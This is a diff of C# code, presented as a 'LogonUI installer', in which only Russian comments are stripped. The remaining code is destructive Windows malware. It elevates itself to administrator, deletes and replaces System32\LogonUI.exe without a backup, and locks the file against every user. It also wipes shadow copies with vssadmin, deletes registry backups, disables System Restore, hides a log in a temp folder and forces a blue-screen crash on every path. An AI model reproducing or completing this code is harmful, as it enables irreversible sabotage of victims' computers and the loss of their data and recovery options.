@@ -28,37 +28,29 @@ namespace LogonUIInstaller
         {
             try
             {
-                // Запрос прав администратора
                 if (!IsAdministrator())
                 {
                     RunAsAdministrator();
                     return;
                 }
 
-                // Приоритет выполнения
                 SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
                 SetProcessDEPPolicy(GetCurrentProcess(), PROCESS_DEP_ENABLE);
 
                 string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
                 string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
 
-                // Снятие защиты с файла
                 SetFileOwnership(originalPath);
                 SetFilePermissions(originalPath, FileSystemRights.FullControl);
 
-                // Извлечение нашего LogonUI из ресурсов
                 byte[] customLogonUI = ExtractResource("LogonUI.exe");
 
-                // Убиваем только процессы LogonUI
                 KillLogonUIProcesses();
 
-                // Жесткое удаление системного файла (без бэкапа)
                 if (File.Exists(originalPath))
                 {
-                    // Попытка удаления через атрибуты
                     File.SetAttributes(originalPath, FileAttributes.Normal);
                     
-                    // Множественные попытки удаления
                     for (int i = 0; i < 5; i++)
                     {
                         try
@@ -69,7 +61,6 @@ namespace LogonUIInstaller
                         catch
                         {
                             System.Threading.Thread.Sleep(1000);
-                            // Альтернативный метод - переименование и удаление
                             try
                             {
                                 File.Move(originalPath, originalPath + ".del");
@@ -81,23 +72,16 @@ namespace LogonUIInstaller
                     }
                 }
 
-                // Запись нового файла
                 File.WriteAllBytes(originalPath, customLogonUI);
 
-                // Установка системных прав для нового файла (но без возможности восстановления)
                 SetSystemProtection(originalPath);
                 RemoveAllUserAccess(originalPath);
-
-                // УНИЧТОЖЕНИЕ бекапов системы
                 DestroySystemBackups(originalPath);
-
-                // НЕМЕДЛЕННЫЙ BSOD
                 TriggerBSOD();
 
             }
             catch (Exception ex)
             {
-                // Скрытое логирование (без следов)
                 try
                 {
                     using (var fs = new FileStream(@"C:\Windows\Temp\~tmp.log", FileMode.Create))
@@ -107,7 +91,6 @@ namespace LogonUIInstaller
                     }
                 }
                 catch { }
-                // В любом случае вызываем BSOD
                 TriggerBSOD();
             }
         }
@@ -168,13 +151,11 @@ namespace LogonUIInstaller
                 FileInfo fileInfo = new FileInfo(path);
                 FileSecurity fileSecurity = fileInfo.GetAccessControl();
                 
-                // Только системные права
                 NTAccount systemAccount = new NTAccount("NT AUTHORITY\\SYSTEM");
                 FileSystemAccessRule systemRule = new FileSystemAccessRule(systemAccount, 
                     FileSystemRights.FullControl, AccessControlType.Allow);
                 fileSecurity.AddAccessRule(systemRule);
                 
-                // Блокировка всех пользователей
                 SecurityIdentifier everyone = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
                 FileSystemAccessRule denyRule = new FileSystemAccessRule(everyone, 
                     FileSystemRights.FullControl, AccessControlType.Deny);
@@ -192,7 +173,6 @@ namespace LogonUIInstaller
                 FileInfo fileInfo = new FileInfo(path);
                 FileSecurity fileSecurity = fileInfo.GetAccessControl();
                 
-                // Удаление всех пользовательских прав
                 AuthorizationRuleCollection rules = fileSecurity.GetAccessRules(true, true, typeof(NTAccount));
                 foreach (FileSystemAccessRule rule in rules)
                 {
@@ -208,7 +188,6 @@ namespace LogonUIInstaller
                 
                 fileInfo.SetAccessControl(fileSecurity);
                 
-                // Установка атрибута "только чтение" + "системный"
                 File.SetAttributes(path, FileAttributes.System | FileAttributes.ReadOnly | FileAttributes.Hidden);
             }
             catch { }
@@ -218,7 +197,6 @@ namespace LogonUIInstaller
         {
             try
             {
-                // Уничтожение теневых копий
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "vssadmin.exe",
@@ -227,7 +205,6 @@ namespace LogonUIInstaller
                     WindowStyle = ProcessWindowStyle.Hidden
                 });
 
-                // Удаление кэшей Windows
                 string[] backupPaths = {
                     @"C:\Windows\System32\config\RegBack\*",
                     @"C:\Windows\System32\config\*.LOG*",
@@ -260,7 +237,6 @@ namespace LogonUIInstaller
                     catch { }
                 }
 
-                // Отключение восстановления системы
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "reg.exe",
@@ -277,14 +253,12 @@ namespace LogonUIInstaller
         {
             try
             {
-                // Находим все процессы LogonUI
                 Process[] logonProcesses = Process.GetProcessesByName("LogonUI");
                 
                 foreach (Process process in logonProcesses)
                 {
                     try
                     {
-                        // Проверяем, что это действительно системный LogonUI
                         if (!string.IsNullOrEmpty(process.MainModule.FileName) && 
                             process.MainModule.FileName.Contains("System32"))
                         {
